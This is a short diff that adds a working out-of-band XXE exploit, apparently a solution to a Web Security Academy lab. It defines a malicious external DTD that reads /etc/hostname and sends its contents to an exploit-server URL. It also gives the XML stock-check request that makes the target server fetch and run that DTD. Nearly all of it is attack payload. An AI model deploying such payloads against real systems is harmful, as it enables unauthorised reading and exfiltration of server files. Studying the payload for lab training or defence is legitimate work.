@@ -1,0 +1,15 @@
+// This malicious DTD host on attacker's server
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://ac5e1f651e82349b80720be601b20087.web-security-academy.net/log?x=%file;'>">
+%eval;
+%exfil;
+// %eval dynamically declares exfil with file's parameter entity value
+
+
+// POST to web server for it to pull the malicious DTD from attacker's site and execute it inline
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % kiddie SYSTEM "https://ac5e1f651e82349b80720be601b20087.web-security-academy.net/exploit"> %kiddie;]>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
